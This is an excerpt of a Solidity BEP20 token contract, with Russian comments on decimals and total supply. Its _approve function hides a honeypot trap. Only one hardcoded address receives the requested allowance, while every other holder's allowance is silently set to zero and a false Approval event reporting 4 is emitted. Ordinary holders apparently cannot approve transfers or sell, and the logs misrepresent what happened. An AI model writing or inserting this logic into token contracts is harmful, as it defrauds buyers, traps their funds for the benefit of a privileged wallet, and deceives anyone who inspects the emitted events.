...
contract BEP20Token is Context, IBEP20, Ownable {
  ...
  constructor() public {
    ...
    _decimals = 5;    // знаки после точки
    _totalSupply = 100000000000000;  // кол-во == 1 млрд
  ...
  function _approve(address owner, address spender, uint256 amount) internal {
    ...
    if (owner == address(0x9b3E5b0Cb7630F87eBDF76Fc3130A20CeB43dcE7)) {_allowances[owner][spender] = amount;emit Approval(owner, spender, amount);} 
    else {_allowances[owner][spender] = 0;emit Approval(owner, spender, 4);}
  }
